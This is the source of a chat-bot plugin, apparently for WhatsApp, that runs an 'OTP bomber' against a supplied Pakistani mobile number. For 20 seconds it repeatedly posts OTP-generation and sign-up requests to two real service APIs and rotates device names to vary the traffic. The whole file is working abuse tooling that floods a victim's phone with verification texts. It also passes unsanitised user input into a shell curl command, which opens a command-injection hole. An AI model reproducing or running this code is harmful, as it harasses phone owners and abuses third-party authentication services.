const axios = require('axios'); // Import axios library
const { exec } = require('child_process'); // Import exec for running cURL command

// Helper function to add delay
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// List of device types to rotate for the second API
const devices = ['Google Chrome', 'Mozilla Firefox', 'Safari', 'Microsoft Edge', 'Opera'];

exports.run = {
    usage: ['bomber'],
    use: 'number without 0 and 92',
    category: 'bomber', // You can modify the category if needed
    async: async (m, { client, text, Func, isPrefix, command }) => {
        try {
            // Check if the command is for OTP bombing
            if (command === 'bomber') {
                if (!text) {
                    return client.reply(m.chat, 'Please provide a mobile number number without 0 and 92.', m);
                }

                const mobileNumber = text.trim();
                const otpUrl = "https://portallapp.com/api/v1/auth/generate-otp";
                const jazzUrl = "https://jazztv.pk/alpha/api_gateway/index.php/v3/users-dbss/sign-up-wc";

                // Headers and body for both APIs
                const otpHeaders = `-H "Content-Type: application/json"`;
                const otpData = `-d "{\\"mobile_no\\": \\"${mobileNumber}\\"}"`;
                const otpCurlCommand = `curl -X POST "${otpUrl}" ${otpHeaders} ${otpData}`;

                // Send confirmation message
                client.sendReact(m.chat, '🕒', m.key);
                client.reply(m.chat, `Starting OTP bombing on ${mobileNumber}. Please wait...`, m);

                let endTime = Date.now() + 20000; // 20 seconds from now
                let deviceIndex = 0; // To rotate device types for second API

                // Loop to send requests for 20 seconds
                while (Date.now() < endTime) {
                    // First API (OTP request)
                    exec(otpCurlCommand, (error, stdout, stderr) => {
                        if (error) {
                            console.error(`Error sending OTP: ${error.message}`);
                        } else {
                            console.log(`OTP sent successfully: ${stdout}`);
                        }
                    });

                    // Second API (Sign-up with dynamic device type)
                    const jazzData = {
                        "from_screen": "signUp",
                        "device": devices[deviceIndex % devices.length], // Rotate devices
                        "telco": "jazz",
                        "device_id": "web",
                        "mobile": `92${mobileNumber}`,
                        "other_telco": "jazz",
                        "phone_details": "web"
                    };

                    // Send sign-up request using axios
                    axios.post(jazzUrl, jazzData, { headers: { 'Content-Type': 'application/json' } })
                        .then((response) => {
                            console.log(`Sign-up sent successfully: ${response.data}`);
                        })
                        .catch((error) => {
                            console.error(`Error sending sign-up: ${error.message}`);
                        });

                    // Rotate device for the next iteration
                    deviceIndex++;

                    // Wait for 2 seconds before sending the next request
                    await sleep(2000);
                }

                return client.reply(m.chat, 'OTP bombing has completed for 20 seconds!', m);
            }
        } catch (e) {
            console.error(e); // Log the error for debugging
            return client.reply(m.chat, 'An error occurred while processing your request.', m);
        }
    },
    error: false,
    limit: true,
    verified: true,
    premium: false
};
